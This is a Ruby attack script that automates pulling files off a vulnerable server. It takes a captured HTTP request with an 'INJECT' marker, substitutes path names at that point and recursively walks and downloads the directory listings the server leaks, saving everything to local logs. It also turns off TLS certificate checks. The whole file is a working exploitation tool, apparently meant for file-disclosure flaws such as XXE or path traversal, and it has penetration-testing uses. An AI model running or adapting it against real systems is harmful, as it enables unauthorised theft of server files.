#!/usr/bin/env ruby

require 'fileutils'
require 'uri'
require 'net/http'
require 'net/https'
require 'readline'

# CONFIGURE
$file = "" # file with vulnerable HTTP request
$proto = "http" # protocol to use - http/https
$proxy = "" # proxy host
$proxy_port = "" # proxy port
enumall = "n" # if yes script will not ask what to enumerate (prone to false positives) - y/n
$verbose = "n" # verbose messaging
$port = 0 # remote host application port
$remote = "" # remote host URL/IP address

# holds HTTP responses
$response = ""
# regex to find directory listings
$regex = /^[$.\-_~ 0-9A-Za-z]+$/
# array that holds filenames to enumerate
$filenames = Array.new
# temp path holders - hold next filenames in different formats for enumeration
$nextpath = ""
$tmppath = ""
$path = ""
# array that contains skipped and allowed paths
blacklist = Array.new
whitelist = Array.new
# other variables
$method = "POST" # HTTP method
cmp = "" # holds user input
i = 0 # main counter
$time = 30 # HTTP response timeout

# set all variables
ARGV.each do |arg|
	$file = arg.split("=")[1] if arg.include?("--file=")
	$proto = "https" if arg.include?("--ssl")
	$proxy = arg.split("=")[1].split(":")[0] if arg.include?("--proxy=")
	$proxy_port = arg.split("=")[1].split(":")[1] if arg.include?("--proxy=")
	enumall = "y" if arg.include?("--fast")
	$verbose = "y" if arg.include?("--verbose")
	$time = Integer(arg.split("=")[1]) if arg.include?("--timeout=")
	$port = Integer(arg.split("=")[1]) if arg.include?("--rport=")
	$remote = arg.split("=")[1] if arg.include?("--rhost=")
end

# show main menu
if ARGV.nil? || ARGV.size < 1 || $file == "" 
	puts "Script automates file downloading when plaintext directory listing was found."
	puts ""
	puts "Options:"
	puts "  --file	Mandatory - file containing valid HTTP request with \"INJECT\" mark point. Mark point specifies where enumerated filenames should be appended. (--file=/tmp/req.txt)"
	puts ""
	puts "  --rhost	Remote host's IP address or domain name. Use this argument only for requests without Host header. (--rhost=192.168.0.3)"
	puts "  --rport	Remote host's TCP port. Use this argument only for requests without Host header and for non-default values. (--rport=8080)"
	puts ""
	puts "  --ssl		Use SSL."
	puts "  --proxy	Proxy to use. (--proxy=127.0.0.1:8080)"
	puts ""
	puts "  --timeout	Timeout for receiving file/directory content. (--timeout=20)"
	puts "  --fast	Skip asking what to enumerate. Prone to false-positives."
	puts "  --verbose	Show verbose messages."
	puts ""
	puts "Example usage:"
	puts "  ruby #{__FILE__} --file=/tmp/req.txt --ssl"
	puts ""
	exit(1)
end

# EXECUTION

### Processing Request File ###

# Configure basic options

# set proxy
if $proxy == ""
	$proxy = nil
	$proxy_port = nil
end

# get connection host and port
z = 1
loop do
	break if File.readlines($file)[z].chomp.empty?
	if File.readlines($file)[z].include?("Host: ")
		$remote = File.readlines($file)[z].split(" ")[1]
		if $remote.include?(":")
			$port = $remote.split(":")[1]
			$remote = $remote.split(":")[0]
		end
	end
	z = z + 1
end
if $port == 0
	if $proto == "http"
		$port = 80
	else
		$port = 443
	end	
end

# Configure main request
def configreq()

	found = 0 # indicates if injection mark was found

	# assign HTTP method
	$method = File.readlines($file)[0].split(" ")[0]

	# get URI path
	$uri = File.readlines($file)[0].split(" ")[1]
	turi = URI.decode($uri).gsub("+", " ")
	if turi.include?("INJECT")
		$uri = $uri.sub("INJECT", "#{$path}")
		found = found + 1
		puts "Injection mark replaced." if $verbose == "y"
	end

	# get headers
	i = 1
	$headers = Hash.new
	loop do
		break if File.readlines($file)[i].chomp.empty?
		if !File.readlines($file)[i].include?("Host: ")
			header = File.readlines($file)[i].chomp
			if header.include?("INJECT")
				header = header.sub("INJECT", "#{$path}")
				found = found + 1
				puts "Injection mark replaced." if $verbose == "y"
			end
			if header.include?("Accept-Encoding")
			else
				$headers[header.split(": ")[0]] = header.split(": ")[1]
			end
		end
		i = i + 1
	end

	# get body
	i = i + 1
	$post = ""
	postfind = 0
	loop do
		break if File.readlines($file)[i].nil?
		postline = File.readlines($file)[i]
		tline = URI.decode(postline).gsub("+", " ")
		if tline.include?("INJECT")
			postline = postline.sub("INJECT", "#{$path}")
			found = found + 1
			puts "Injection mark replaced." if $verbose == "y"
		end
		$post += postline
		i = i + 1
	end

	# update Content-Length header
	if $headers.include? 'Content-Length'
		$headers["Content-Length"] = String($post.bytesize)
	end

	# detect injection mark
	if found == 0
		puts "Injection point was not found."
		exit(1)
	elsif found > 1
		puts "Multiple instances of injection point were found. It may results in false-positives."
	end

	# configure request
	$request = Net::HTTP.new($remote, $port, $proxy, $proxy_port)

	# set HTTPS
	if $proto == "https"
		$request.use_ssl = true
		$request.verify_mode = OpenSSL::SSL::VERIFY_NONE
	end
end

### End of Processing Request File ###

# Sending request
def sendreq()

	if $verbose == "y"
		puts "Sending following request:"
		if $proto == "http"
			puts "http://#{$remote}:#{$port}#{$uri}"
			puts $headers
			puts "\n"
			puts $post
			puts "\n"
		else
			puts "https://#{$remote}:#{$port}#{$uri}"
			puts $headers
			puts "\n"
			puts $post
			puts "\n"
		end
	else
		puts "Sending request."
	end

	$response = ""
	begin
		status = Timeout::timeout($time) {
			if ['GET', 'HEAD', 'TRACE', 'OPTIONS', 'MOVE', 'COPY', 'DELETE'].include? $method
				$response = $request.send_request($method, $uri, nil, $headers)
			else
				$response = $request.send_request($method, $uri, $post, $headers)
			end
		}
	rescue Timeout::Error
	end
end

# logging to separate file
def log(param)
	logpath = ""
	if $nextpath != ""
		logpath += "/"
	end
	logpath += "#{$nextpath}"
	if $tmppath != ""
		FileUtils.mkdir_p "Logs/" + $remote + "/" + logpath.split("/")[0..-2].join('/')
	else
		if logpath.include?("/")
			FileUtils.mkdir_p "Logs/" + $remote + "/" + logpath.split("/")[0..-2].join('/')
		else
			FileUtils.mkdir_p "Logs/" + $remote + "/" + logpath
		end
	end
	if  $done == 0
		puts "Successfully logged file: #{logpath}"
		$done = 1
	end
	if logpath == ""
		log = File.open("Logs/" + $remote + "/" + "rootdir.log", "a")
	else
		log = File.open("Logs/" + $remote + "/" + "#{logpath}.log", "a")
	end
	log.write param
	log.close
end

# pushing enumerated items to an array
def pusharr(param)
	param = param.chomp
	if param.match $regex
		logp = $nextpath
		if $nextpath != ""
			logp += "/"
		end
		logp += param
		$filenames.push(logp)
		puts "Path pushed to array: #{logp}" if $verbose == "y"
	end
end

# Sending first request
$done = 0
$path = ""
configreq()
sendreq()
$response.body.split("\n").each do |param|				
	# log to separate file
	log(param + "\n")

	# push to array if directory listing is detected for further enumeration
	param = param.chomp
	if param.match $regex
		$filenames.push(param)
		puts "Path pushed to array: #{param}" if $verbose == "y"
	end
end

# read, ask and further enumerate
loop do
	if !$filenames[i].nil?
		
		# Read next line
		line = $filenames[i]
		line = line.chomp
		line = line.gsub(' ','%20')
		
		# Check if a file should be enumerated
		check = "#{line}".split("/")[0..-2].join('/')

		if enumall != "y" && !blacklist.include?(check) && !whitelist.include?(check)
			puts "Enumerate #{line} ? Y[yes]/n[no]/s[skip all files in this directory]/a[enum all files in this directory]"
			cmp = Readline.readline("> ", true)
			Readline::HISTORY.push
			if cmp == "s" || cmp == "S"
				blacklist.push("#{line}".split("/")[0..-2].join('/'))
			end
			if cmp == "a" || cmp == "A"
				whitelist.push("#{line}".split("/")[0..-2].join('/'))
				cmp = "y"
			end
		elsif	enumall == "y" || whitelist.include?(check)
			cmp = "y"
		else 
			cmp = "n"
		end
		if cmp == "y" || cmp == "Y" || cmp == ""
			$nextpath = "#{line}"
		
			# Send request with next filename
			$path = "#{line}"
			configreq()
			sendreq()
			$done = 0

			$response.body.split("\n").each do |param|				
				# log to separate file
				log(param + "\n")
				
				# push to array if directory listing is detected for further enumeration
				pusharr(param)
			end
		end
		i = i + 1
	else
		puts "Nothing else to do. Exiting."
		exit(1)
	end
end

